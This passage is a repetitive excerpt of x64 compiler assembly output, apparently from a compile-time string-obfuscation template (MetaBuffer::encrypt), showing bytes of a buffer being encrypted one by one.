  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
